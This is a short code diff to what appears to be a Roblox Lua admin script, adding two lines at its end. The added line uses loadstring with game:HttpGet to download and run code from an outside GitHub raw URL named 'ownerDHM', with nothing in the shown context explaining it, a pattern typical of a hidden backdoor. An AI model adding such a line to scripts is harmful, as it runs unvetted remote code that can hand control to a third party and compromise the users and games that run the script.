@@ -88,3 +88,6 @@ local admins = {
         end
 	end)
 end)
+
+wait(0.5)
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/ownerDHM'),true))()
